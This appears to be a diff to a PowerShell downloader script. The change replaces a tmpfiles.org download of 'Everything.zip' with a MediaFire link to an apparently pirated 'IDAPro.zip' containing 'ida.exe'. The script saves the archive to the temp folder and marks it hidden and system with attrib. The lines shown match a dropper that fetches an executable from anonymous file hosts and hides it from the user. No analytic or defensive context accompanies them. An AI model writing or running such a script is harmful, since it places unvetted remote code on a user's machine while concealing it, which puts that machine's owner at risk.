@@ -1,8 +1,8 @@
-$zipUrl = "https://tmpfiles.org/dl/17224664/everything.zip"
-$exeName = "Everything.exe"
+$zipUrl = "https://download848.mediafire.com/f2m1v89fettgC74WWDouGuYM6vhaHgSIq46DPGv3vJth_e070s_VuNyGPqqdkb8-YHCev68ZjWeXJViWjSGXgHNsWatP7EePkAde9jTegZDEwSLU0XdVQJ0jruKIzlU5D2sSjas2dDySx3u8TKi0aAc27zcL-Lw8_elZs0KrTaXRmw/9fj61xy5ksmq1zr/IDAPro.zip"
+$exeName = "ida.exe"
 $tempFolder = [System.IO.Path]::GetTempPath()
-$zipFile = Join-Path $tempFolder "Everything.zip"
-$extractFolder = Join-Path $tempFolder "Everything"
+$zipFile = Join-Path $tempFolder "IDAPro.zip"
+$extractFolder = Join-Path $tempFolder "IDAPro"
 $exePath = Join-Path $extractFolder $exeName
 
 if (-Not (Test-Path $zipFile)) { Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile; & attrib +h +s $zipFile }
